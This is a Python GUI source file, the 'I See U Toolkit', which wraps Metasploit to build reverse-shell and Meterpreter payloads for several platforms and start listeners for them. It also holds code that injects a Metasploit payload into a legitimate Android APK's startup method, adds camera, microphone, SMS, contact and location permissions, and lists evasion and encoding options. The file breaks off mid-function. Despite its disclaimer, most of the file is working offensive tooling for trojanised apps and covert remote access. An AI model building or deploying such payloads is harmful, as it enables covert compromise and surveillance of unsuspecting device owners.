#!/usr/bin/env python
"""
I See U Toolkit GUI v1.4 - Graphical User Interface (Python 2/3 Compatible)
A complete GUI for the surveillance and monitoring payload generation toolkit.
DISCLAIMER: This tool is for educational and authorized security testing purposes only.
Unauthorized use of this tool for malicious purposes is illegal and unethical.
Users are responsible for obtaining proper authorization before using this tool.
"""

import os
import sys
import subprocess
import json
import logging
import argparse
import tempfile
import shutil
import zipfile
import xml.etree.ElementTree as ET
import time
import socket
import fcntl
import struct
import platform
import re
from datetime import datetime

# Python version detection
PY2 = sys.version_info[0] == 2
PY3 = sys.version_info[0] == 3

# Import appropriate modules based on Python version
if PY3:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
    from tkinter import simpledialog
    import tkinter.font as tkfont
    # Import ScrolledText correctly for Python 3
    from tkinter import scrolledtext
else:
    import Tkinter as tk
    import ttk
    import tkFileDialog as filedialog
    import tkMessageBox as messagebox
    import tkSimpleDialog as simpledialog
    import ScrolledText
    import tkFont as tkfont

# Import pathlib if available, otherwise use os.path
try:
    from pathlib import Path
    HAS_PATHLIB = True
except ImportError:
    HAS_PATHLIB = False

# Threading import
try:
    import threading
except ImportError:
    import dummy_threading as threading

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('iseeu_toolkit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Colors class for terminal output (simplified for GUI)
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Import the original ISeeUToolkit class (modified for Python 2/3 compatibility)
class ISeeUToolkit:
    """Advanced surveillance payload generator with proper Android support."""
    
    def __init__(self):
        self.config_file = "iseeu_config.json"
        self.output_dir = "generated_payloads"
        self.templates_dir = "templates"
        self.android_tools_dir = "android_tools"
        
        # Create necessary directories
        try:
            if PY3:
                os.makedirs(self.output_dir, exist_ok=True)
                os.makedirs(self.templates_dir, exist_ok=True)
                os.makedirs(self.android_tools_dir, exist_ok=True)
            else:
                # Python 2 compatibility
                if not os.path.exists(self.output_dir):
                    os.makedirs(self.output_dir)
                if not os.path.exists(self.templates_dir):
                    os.makedirs(self.templates_dir)
                if not os.path.exists(self.android_tools_dir):
                    os.makedirs(self.android_tools_dir)
        except:
            pass
        
        # Load or create configuration
        self.config = self.load_config()
        
        # Modern payload configurations with CORRECT Android formats
        self.payload_configs = {
            "windows": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "windows/x64/meterpreter/reverse_tcp",
                        "reverse_http": "windows/x64/meterpreter/reverse_http",
                        "reverse_https": "windows/x64/meterpreter/reverse_https"
                    },
                    "non_staged": {
                        "reverse_tcp": "windows/x64/meterpreter_reverse_tcp",
                        "reverse_http": "windows/x64/meterpreter_reverse_http",
                        "reverse_https": "windows/x64/meterpreter_reverse_https"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "windows/x64/shell/reverse_tcp",
                        "reverse_http": "windows/x64/shell/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "windows/x64/shell_reverse_tcp",
                        "reverse_http": "windows/x64/shell_reverse_http"
                    }
                },
                "fetch": {
                    "http": "cmd/windows/http/x64/meterpreter/reverse_tcp",
                    "https": "cmd/windows/https/x64/meterpreter/reverse_tcp"
                },
                "formats": ["exe", "exe-only", "dll", "service", "powershell"]
            },
            "linux": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
                        "reverse_http": "linux/x64/meterpreter/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "linux/x64/meterpreter_reverse_tcp",
                        "reverse_http": "linux/x64/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "linux/x64/shell/reverse_tcp",
                        "reverse_http": "linux/x64/shell/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "linux/x64/shell_reverse_tcp",
                        "reverse_http": "linux/x64/shell_reverse_http"
                    }
                },
                "fetch": {
                    "http": "cmd/linux/http/x64/meterpreter/reverse_tcp",
                    "https": "cmd/linux/https/x64/meterpreter/reverse_tcp"
                },
                "formats": ["elf", "elf-so", "raw"]
            },
            "android": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "android/meterpreter/reverse_tcp",
                        "reverse_http": "android/meterpreter/reverse_http",
                        "reverse_https": "android/meterpreter/reverse_https"
                    },
                    "non_staged": {
                        "reverse_tcp": "android/meterpreter_reverse_tcp",
                        "reverse_http": "android/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "android/shell/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "android/shell_reverse_tcp"
                    }
                },
                "java": {
                    "staged": {
                        "reverse_tcp": "java/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "java/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["apk", "raw", "elf", "elf-so"]
            },
            "macos": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "osx/x64/meterpreter/reverse_tcp",
                        "reverse_http": "osx/x64/meterpreter/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/x64/meterpreter_reverse_tcp",
                        "reverse_http": "osx/x64/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "osx/x64/shell/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/x64/shell_reverse_tcp"
                    }
                },
                "arm": {
                    "staged": {
                        "reverse_tcp": "osx/arm64/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/arm64/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["macho", "raw"]
            },
            "ios": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "ios/arm64/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "ios/arm64/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["raw"]
            }
        }
        
        # Android-specific configurations
        self.android_configs = {
            "target_sdk_versions": {
                "android_10": 29,
                "android_11": 30,
                "android_12": 31,
                "android_13": 33,
                "android_14": 34,
                "android_15": 35
            },
            "permissions": {
                "basic": [
                    "android.permission.INTERNET",
                    "android.permission.ACCESS_NETWORK_STATE"
                ],
                "storage": [
                    "android.permission.READ_EXTERNAL_STORAGE",
                    "android.permission.WRITE_EXTERNAL_STORAGE"
                ],
                "location": [
                    "android.permission.ACCESS_FINE_LOCATION",
                    "android.permission.ACCESS_COARSE_LOCATION"
                ],
                "camera": [
                    "android.permission.CAMERA"
                ],
                "microphone": [
                    "android.permission.RECORD_AUDIO"
                ],
                "contacts": [
                    "android.permission.READ_CONTACTS"
                ],
                "sms": [
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS"
                ],
                "calls": [
                    "android.permission.READ_CALL_LOG",
                    "android.permission.WRITE_CALL_LOG"
                ]
            },
            "evasion_techniques": [
                "apk_wrapper",
                "permission_obfuscation",
                "native_code_embedding",
                "reflection_loading"
            ]
        }
        
        # Encoding options
        self.encoders = [
            "x86/shikata_ga_nai",
            "x64/xor_dynamic",
            "cmd/powershell_base64",
            "generic/none"
        ]
        
        # Terminal emulators to try (in order of preference)
        self.terminal_emulators = [
            "xterm",
            "gnome-terminal",
            "konsole",
            "xfce4-terminal",
            "mate-terminal",
            "lxterminal",
            "terminator"
        ]
        
        # Template files
        self.template_files = {
            "windows": ["template.exe", "template.dll"],
            "linux": ["template.elf", "template.elf-so"],
            "android": ["template.apk"]
        }
        
        # Check for required Android tools
        self.check_android_tools()
        
    def check_android_tools(self):
        """Check if required Android tools are available."""
        self.tools_available = {
            "apktool": self.which("apktool") is not None,
            "keytool": self.which("keytool") is not None,
            "jarsigner": self.which("jarsigner") is not None,
            "zipalign": self.which("zipalign") is not None
        }
        
        missing_tools = [tool for tool, available in self.tools_available.items() if not available]
        if missing_tools:
            logger.warning("Missing Android tools: {}".format(", ".join(missing_tools)))
            logger.warning("Enhanced Android payload generation may not work properly")
        else:
            logger.info("All required Android tools are available")
    
    def which(self, program):
        """Find executable in PATH (Python 2/3 compatible)."""
        import os
        def is_exe(fpath):
            return os.path.isfile(fpath) and os.access(fpath, os.X_OK)
        
        fpath, fname = os.path.split(program)
        if fpath:
            if is_exe(program):
                return program
        else:
            for path in os.environ["PATH"].split(os.pathsep):
                path = path.strip('"')
                exe_file = os.path.join(path, program)
                if is_exe(exe_file):
                    return exe_file
        return None
    
    def get_system_ip(self):
        """Automatically detect system IP address."""
        try:
            # Create a socket to determine the best IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            # Fallback method for Linux
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                return ip
            except Exception:
                # Final fallback - get all interfaces
                try:
                    for interface in [b'eth0', b'wlan0', b'wlo1', b'enp0s3']:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            ip = socket.inet_ntoa(fcntl.ioctl(
                                s.fileno(),
                                0x8915,  # SIOCGIFADDR
                                struct.pack('256s', interface[:15])
                            )[20:24])
                            s.close()
                            if ip != '127.0.0.1':
                                return ip
                        except:
                            continue
                except:
                    pass
                return self.config.get('default_lhost', '192.168.1.100')
    
    def load_config(self):
        """Load configuration from file or create default."""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except (ValueError, IOError) as e:
            logger.warning("Could not load config file: {}".format(e))
        
        # Default configuration
        return {
            "default_lhost": self.get_system_ip(),
            "default_lport": "4444",
            "default_encoder": "x86/shikata_ga_nai",
            "default_format": "exe",
            "use_template": False,
            "template_file": "",
            "iterations": 1,
            "auto_start_handler": False,
            "open_terminal_for_handler": True,
            "terminal_emulator": "auto",
            "terminal_title": "I See U Toolkit - Metasploit Handler",
            "auto_detect_ip": True,
            "payload_type_preference": "staged",
            "android_settings": {
                "target_sdk": "android_11",
                "use_wrapper": True,
                "obfuscate_permissions": True,
                "request_all_permissions": False,
                "evasion_technique": "apk_wrapper",
                "keystore_path": "mykey.keystore",
                "keystore_password": "android",
                "key_alias": "mykey",
                "key_password": "android"
            }
        }
    
    def save_config(self):
        """Save current configuration to file."""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            logger.info("Configuration saved successfully")
        except IOError as e:
            logger.error("Could not save config file: {}".format(e))
    
    def get_available_terminal(self):
        """Find an available terminal emulator."""
        if self.config.get("terminal_emulator") != "auto":
            # Check if the specified terminal is available
            terminal = self.config.get("terminal_emulator")
            if self.which(terminal):
                return terminal
            else:
                logger.warning("Specified terminal '{}' not found, falling back to auto-detection".format(terminal))
        
        # Auto-detect available terminals
        for terminal in self.terminal_emulators:
            if self.which(terminal):
                logger.info("Found terminal emulator: {}".format(terminal))
                return terminal
        
        logger.error("No suitable terminal emulator found")
        return None
    
    def start_metasploit_handler_in_terminal(self, payload, lhost, lport):
        """Start Metasploit handler in a new terminal window."""
        try:
            # Get the terminal command
            terminal = self.get_available_terminal()
            if not terminal:
                print("{}❌ No terminal emulator found. Starting in background instead.{}".format(Colors.RED, Colors.END))
                return self.start_metasploit_handler_background(payload, lhost, lport)
            
            # Build the msfconsole command
            msf_cmd = (
                "msfconsole -x "
                "'use exploit/multi/handler; "
                "set PAYLOAD {}; "
                "set LHOST {}; "
                "set LPORT {}; "
                "exploit'"
            ).format(payload, lhost, lport)
            
            # Build the terminal command based on the terminal type
            if terminal == "xterm":
                term_cmd = [
                    "xterm",
                    "-title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-bg", "black",
                    "-fg", "green",
                    "-e", msf_cmd
                ]
            elif terminal == "gnome-terminal":
                term_cmd = [
                    "gnome-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "--", "bash", "-c", "{}; exec bash".format(msf_cmd)
                ]
            elif terminal == "konsole":
                term_cmd = [
                    "konsole",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-e", msf_cmd
                ]
            elif terminal == "xfce4-terminal":
                term_cmd = [
                    "xfce4-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-x", "bash", "-c", "{}; exec bash".format(msf_cmd)
                ]
            elif terminal == "mate-terminal":
                term_cmd = [
                    "mate-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-x", "bash", "-c", "{}; exec bash".format(msf_cmd)
                ]
            elif terminal == "lxterminal":
                term_cmd = [
                    "lxterminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-e", "bash -c '{}; exec bash'".format(msf_cmd)
                ]
            elif terminal == "terminator":
                term_cmd = [
                    "terminator",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-e", "bash -c '{}; exec bash'".format(msf_cmd)
                ]
            else:
                # Fallback to generic approach
                term_cmd = [terminal, "-e", msf_cmd]
            
            logger.info("Starting Metasploit handler in {}: {}".format(terminal, " ".join(term_cmd)))
            
            # Start the terminal with the command
            subprocess.Popen(term_cmd)
            
            print("{}✅ Metasploit handler started in new {} window{}".format(Colors.GREEN, terminal, Colors.END))
            print("   {}Title: {}{}".format(Colors.CYAN, self.config.get('terminal_title', 'Metasploit Handler'), Colors.END))
            print("   {}Payload: {}{}".format(Colors.YELLOW, payload, Colors.END))
            print("   {}LHOST: {}{}".format(Colors.YELLOW, lhost, Colors.END))
            print("   {}LPORT: {}{}".format(Colors.YELLOW, lport, Colors.END))
            
            # Give it a moment to start
            time.sleep(2)
            
            return True
            
        except Exception as e:
            logger.error("Failed to start Metasploit handler in terminal: {}".format(e))
            print("{}❌ Failed to start terminal. Starting in background instead.{}".format(Colors.RED, Colors.END))
            return self.start_metasploit_handler_background(payload, lhost, lport)
    
    def start_metasploit_handler_background(self, payload, lhost, lport):
        """Start Metasploit handler in the background."""
        try:
            # Build the msfconsole command
            msf_cmd = (
                "msfconsole -x "
                "'use exploit/multi/handler; "
                "set PAYLOAD {}; "
                "set LHOST {}; "
                "set LPORT {}; "
                "exploit'"
            ).format(payload, lhost, lport)
            
            logger.info("Starting Metasploit handler in background: {}".format(msf_cmd))
            
            # Start in background
            subprocess.Popen(
                msf_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            print("{}✅ Metasploit handler started in background{}".format(Colors.GREEN, Colors.END))
            print("   {}Payload: {}{}".format(Colors.YELLOW, payload, Colors.END))
            print("   {}LHOST: {}{}".format(Colors.YELLOW, lhost, Colors.END))
            print("   {}LPORT: {}{}".format(Colors.YELLOW, lport, Colors.END))
            print("   {}Check your processes or use 'ps aux | grep msfconsole' to verify{}".format(Colors.CYAN, Colors.END))
            
            return True
            
        except Exception as e:
            logger.error("Failed to start Metasploit handler in background: {}".format(e))
            return False
    
    def start_metasploit_handler(self, payload, lhost, lport):
        """Start Metasploit handler using the configured method."""
        if self.config.get("open_terminal_for_handler", True):
            return self.start_metasploit_handler_in_terminal(payload, lhost, lport)
        else:
            return self.start_metasploit_handler_background(payload, lhost, lport)
    
    def find_main_activity(self, manifest_path):
        """Find the main activity from AndroidManifest.xml."""
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Find the activity with LAUNCHER intent filter
            for activity in root.findall(".//activity"):
                for intent_filter in activity.findall("intent-filter"):
                    for action in intent_filter.findall("action"):
                        if action.get("name") == "android.intent.action.MAIN":
                            for category in intent_filter.findall("category"):
                                if category.get("name") == "android.intent.category.LAUNCHER":
                                    return activity.get("name")
            
            return None
        except Exception as e:
            logger.error("Error parsing AndroidManifest.xml: {}".format(e))
            return None
    
    def inject_payload_startup(self, smali_path):
        """Inject payload startup code into the main activity smali file."""
        try:
            with open(smali_path, 'r') as f:
                content = f.read()
            
            # Find the onCreate method
            onCreate_pattern = r'\.method protected onCreate\(Landroid/os/Bundle;\)V'
            match = re.search(onCreate_pattern, content)
            
            if not match:
                print("{}❌ Could not find onCreate method in {}{}".format(Colors.RED, smali_path, Colors.END))
                return False
            
            # Find the position after super.onCreate call
            super_pattern = r'invoke-super \{p[0-9]\}, Landroid/app/Activity;->onCreate\(Landroid/os/Bundle;\)V'
            super_match = re.search(super_pattern, content[match.end():])
            
            if not super_match:
                print("{}❌ Could not find super.onCreate call in {}{}".format(Colors.RED, smali_path, Colors.END))
                return False
            
            # Calculate the position to insert the payload startup code
            insert_pos = match.end() + super_match.end()
            
            # Insert the payload startup code
            payload_code = "\n\n    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\n"
            new_content = content[:insert_pos] + payload_code + content[insert_pos:]
            
            # Write the modified content back to the file
            with open(smali_path, 'w') as f:
                f.write(new_content)
            
            return True
        except Exception as e:
            logger.error("Error injecting payload startup code: {}".format(e))
            return False
    
    def modify_android_manifest(self, manifest_path, permissions):
        """Add required permissions and service to AndroidManifest.xml."""
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Add required permissions
            existing_permissions = set()
            for perm in root.findall("uses-permission"):
                existing_permissions.add(perm.get("name"))
            
            # Always add internet permission if not present
            if "android.permission.INTERNET" not in existing_permissions:
                perm = ET.Element("uses-permission")
                perm.set("android:name", "android.permission.INTERNET")
                root.insert(0, perm)
            
            # Add selected permissions
            for perm_group in permissions:
                if perm_group in self.android_configs["permissions"]:
                    for perm_name in self.android_configs["permissions"][perm_group]:
                        if perm_name not in existing_permissions:
                            perm = ET.Element("uses-permission")
                            perm.set("android:name", perm_name)
                            root.insert(0, perm)
            
            # Add the payload service
            application = root.find("application")
            if application is not None:
                # Check if service already exists
                service_exists = False
                for service in application.findall("service"):
                    if service.get("name") == "com.metasploit.stage.Payload":
                        service_exists = True
                        break
                
                if not service_exists:
                    service = ET.Element("service")
                    service.set("android:name", "com.metasploit.stage.Payload")
                    service.set("android:enabled", "true")
                    service.set("android:exported", "false")
                    application.append(service)
            
            # Write the modified manifest back
            tree.write(manifest_path, encoding="utf-8", xml_declaration=True)
            
            return True
        except Exception as e:
            logger.error("Error modifying AndroidManifest.xml: {}".format(e))
            return False
    
    def execute_command(self, command):
        """Execute the msfvenom command safely."""
        try:
            logger.info("Executing command: {}".format(command))
            
            if PY3:
                # Python 3 - use subprocess.run
                result = subprocess.run(
                    command,
                    shell=True,
                    check=True,
                    capture_output=True,
                    text=True,
                    timeout=300  # 5 minute timeout
                )
                
                if result.returncode == 0:
                    logger.info("Payload generated successfully")
                    if result.stdout:
                        logger.info("Output: {}".format(result.stdout))
                    return True
                else:
                    logger.error("Command failed with return code {}".format(result.returncode))
                    logger.error("Error: {}".format(result.stderr))
                    return False
            else:
                # Python 2 - use subprocess.call
                result = subprocess.call(
                    command,
                    shell=True,
                    timeout=300  # 5 minute timeout
                )
                
                if result == 0:
                    logger.info("Payload generated successfully")
                    return True
                else:
                    logger.error("Command failed with return code {}".format(result))
                    return False
                
        except subprocess.TimeoutExpired:
            logger.error("Command timed out")
            return False
        except Exception as e:
            logger.error("Unexpected error: {}".format(e))
            return False
    
    def sanitize_input(self, input_str, input_type="general"):
        """Sanitize user input based on type."""
        if not isinstance(input_str, str):
            raise ValueError("Input must be a string")
        
        input_str = input_str.strip()
        
        if input_type == "ip":
            # Basic IP validation
            parts = input_str.split('.')
            if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
                raise ValueError("Invalid IP address format")
        elif input_type == "port":
            if not input_str.isdigit() or not (1 <= int(input_str) <= 65535):
                raise ValueError("Port must be between 1 and 65535")
        elif input_type == "filename":
            # Remove dangerous characters
            dangerous_chars = ['/', '\\', ':', '*', '?', '"', '<', '>', '|']
            for char in dangerous_chars:
                input_str = input_str.replace(char, '')
            if not input_str:
                raise ValueError("Filename cannot be empty after sanitization")
        
        return input_str

class ISeeUGUI:
    """GUI for the I See U Toolkit."""
    
    def __init__(self, root):
        self.root = root
        self.root.title("I See U Toolkit v1.4")
        self.root.geometry("900x700")
        self.root.minsize(800, 600)
        
        # Set up the toolkit
        self.toolkit = ISeeUToolkit()
        
        # Configure style
        self.style = ttk.Style()
        self.style.configure("TFrame", background="#f0f0f0")
        self.style.configure("TButton", padding=5, font=('Arial', 10))
        self.style.configure("TLabel", background="#f0f0f0", font=('Arial', 10))
        self.style.configure("Header.TLabel", font=('Arial', 12, 'bold'))
        self.style.configure("TNotebook", background="#f0f0f0")
        self.style.configure("TNotebook.Tab", padding=10)
        
        # Create the main interface
        self.create_widgets()
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Log output
        self.log_text = None
        self.create_log_window()
        
        # Update status with toolkit info
        self.update_status("Toolkit initialized. Default LHOST: {}".format(
            self.toolkit.config.get('default_lhost', '192.168.1.100')))
    
    def create_widgets(self):
        """Create the main GUI widgets."""
        # Create a notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.create_main_tab()
        self.create_traditional_payload_tab()
        self.create_android_injection_tab()
        self.create_fetch_payload_tab()
        self.create_multi_format_tab()
        self.create_listener_tab()
        self.create_settings_tab()
    
    def create_main_tab(self):
        """Create the main tab with overview and quick actions."""
        main_tab = ttk.Frame(self.notebook)
        self.notebook.add(main_tab, text="Main")
        
        # Header frame
        header_frame = ttk.Frame(main_tab)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Title
        title_label = ttk.Label(header_frame, text="I See U Toolkit v1.4", style="Header.TLabel")
        title_label.pack(side=tk.LEFT, padx=5)
        
        # Subtitle
        subtitle_label = ttk.Label(header_frame, text="Advanced Payload Generation Toolkit")
        subtitle_label.pack(side=tk.LEFT, padx=5)
        
        # Banner frame
        banner_frame = ttk.Frame(main_tab)
        banner_frame.pack(fill=tk.X, padx=10, pady=5)
        
        banner_text = tk.Text(banner_frame, height=10, wrap=tk.WORD, bg="#f0f0f0", fg="#333333", 
                             font=('Courier', 10), relief=tk.FLAT)
        banner_text.pack(fill=tk.X, padx=5, pady=5)
        banner_text.insert(tk.END, """
    ╔══════════════════════════════════════════════════════════════╗
    ║                         I SEE U TOOLKIT                       ║
    ║                                                                ║
    ║     ███████╗ ███████╗ ███████╗                                ║
    ║     ██╔════╝ ██╔════╝ ██╔════╝                                ║
    ║     ███████╗ ██████╗  ██████╗                                 ║
    ║     ╚════██║ ██╔══╝  ██╔══╝                                  ║
    ║     ███████║ ███████╗ ███████╗                                ║
    ║     ╚══════╝ ╚══════╝ ╚══════╝                                ║
    ║                                                                ║
    ║                      Advanced Payload Generation              ║
    ║                With Auto IP Detection & Terminal Handling     ║
    ╚══════════════════════════════════════════════════════════════╝
        """)
        banner_text.config(state=tk.DISABLED)
        
        # Quick actions frame
        actions_frame = ttk.LabelFrame(main_tab, text="Quick Actions", padding=10)
        actions_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create buttons for quick actions
        ttk.Button(actions_frame, text="Generate Traditional Payload", 
                  command=lambda: self.notebook.select(1)).pack(fill=tk.X, pady=5)
        ttk.Button(actions_frame, text="Inject Payload into APK", 
                  command=lambda: self.notebook.select(2)).pack(fill=tk.X, pady=5)
        ttk.Button(actions_frame, text="Generate Fetch Payload", 
                  command=lambda: self.notebook.select(3)).pack(fill=tk.X, pady=5)
        ttk.Button(actions_frame, text="Generate Multi-Format Payload", 
                  command=lambda: self.notebook.select(4)).pack(fill=tk.X, pady=5)
        ttk.Button(actions_frame, text="Start Meterpreter Listener", 
                  command=lambda: self.notebook.select(5)).pack(fill=tk.X, pady=5)
        ttk.Button(actions_frame, text="Configure Settings", 
                  command=lambda: self.notebook.select(6)).pack(fill=tk.X, pady=5)
        
        # Info frame
        info_frame = ttk.LabelFrame(main_tab, text="Information", padding=10)
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        info_text = tk.Text(info_frame, height=6, wrap=tk.WORD, bg="#f0f0f0", fg="#333333", 
                           font=('Arial', 10), relief=tk.FLAT)
        info_text.pack(fill=tk.X, padx=5, pady=5)
        info_text.insert(tk.END, """
This toolkit generates Metasploit payloads with modern features and automatic terminal handling.
It supports traditional payloads, fetch payloads, and multi-format generation.

WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL.
ALWAYS OBTAIN PROPER AUTHORIZATION.
        """)
        info_text.config(state=tk.DISABLED)
    
    def create_traditional_payload_tab(self):
        """Create the traditional payload generation tab."""
        trad_tab = ttk.Frame(self.notebook)
        self.notebook.add(trad_tab, text="Traditional Payload")
        
        # Header
        header_label = ttk.Label(trad_tab, text="Generate Traditional Payload", style="Header.TLabel")
        header_label.pack(padx=10, pady=10)
        
        # Main frame
        main_frame = ttk.Frame(trad_tab)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left frame for options
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Platform selection
        platform_frame = ttk.LabelFrame(left_frame, text="Target Platform", padding=10)
        platform_frame.pack(fill=tk.X, pady=5)
        
        self.platform_var = tk.StringVar(value="windows")
        ttk.Radiobutton(platform_frame, text="Windows", variable=self.platform_var, 
                       value="windows").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="Linux", variable=self.platform_var, 
                       value="linux").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="Android", variable=self.platform_var, 
                       value="android").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="macOS", variable=self.platform_var, 
                       value="macos").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="iOS", variable=self.platform_var, 
                       value="ios").pack(anchor=tk.W)
        
        # Payload type
        payload_frame = ttk.LabelFrame(left_frame, text="Payload Type", padding=10)
        payload_frame.pack(fill=tk.X, pady=5)
        
        self.payload_type_var = tk.StringVar(value="meterpreter")
        ttk.Radiobutton(payload_frame, text="Meterpreter", variable=self.payload_type_var, 
                       value="meterpreter").pack(anchor=tk.W)
        ttk.Radiobutton(payload_frame, text="Shell", variable=self.payload_type_var, 
                       value="shell").pack(anchor=tk.W)
        
        # Connection method
        conn_frame = ttk.LabelFrame(left_frame, text="Connection Method", padding=10)
        conn_frame.pack(fill=tk.X, pady=5)
        
        self.conn_method_var = tk.StringVar(value="reverse_tcp")
        ttk.Radiobutton(conn_frame, text="Reverse TCP", variable=self.conn_method_var, 
                       value="reverse_tcp").pack(anchor=tk.W)
        ttk.Radiobutton(conn_frame, text="Reverse HTTP", variable=self.conn_method_var, 
                       value="reverse_http").pack(anchor=tk.W)
        ttk.Radiobutton(conn_frame, text="Reverse HTTPS", variable=self.conn_method_var, 
                       value="reverse_https").pack(anchor=tk.W)
        
        # Output format
        format_frame = ttk.LabelFrame(left_frame, text="Output Format", padding=10)
        format_frame.pack(fill=tk.X, pady=5)
        
        self.format_var = tk.StringVar(value="exe")
        self.format_combo = ttk.Combobox(format_frame, textvariable=self.format_var, 
                                        values=["exe", "dll", "service", "powershell", "elf", "apk", "macho", "raw"])
        self.format_combo.pack(fill=tk.X, pady=5)
        self.format_combo.bind("<<ComboboxSelected>>", self.update_format_options)
        
        # Right frame for connection settings
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Connection settings
        conn_settings_frame = ttk.LabelFrame(right_frame, text="Connection Settings", padding=10)
        conn_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_settings_frame, text="LHOST:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.lhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(conn_settings_frame, textvariable=self.lhost_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="LPORT:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.lport_var = tk.StringVar(value=self.toolkit.config.get('default_lport', '4444'))
        ttk.Entry(conn_settings_frame, textvariable=self.lport_var).grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="Payload Name:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.payload_name_var = tk.StringVar(value="payload")
        ttk.Entry(conn_settings_frame, textvariable=self.payload_name_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        conn_settings_frame.columnconfigure(1, weight=1)
        
        # Encoding options
        encoding_frame = ttk.LabelFrame(right_frame, text="Encoding Options", padding=10)
        encoding_frame.pack(fill=tk.X, pady=5)
        
        self.use_encoding_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(encoding_frame, text="Use Encoding", 
                       variable=self.use_encoding_var).pack(anchor=tk.W)
        
        ttk.Label(encoding_frame, text="Encoder:").pack(anchor=tk.W)
        self.encoder_var = tk.StringVar(value="x86/shikata_ga_nai")
        encoder_combo = ttk.Combobox(encoding_frame, textvariable=self.encoder_var, 
                                    values=self.toolkit.encoders)
        encoder_combo.pack(fill=tk.X, pady=2)
        
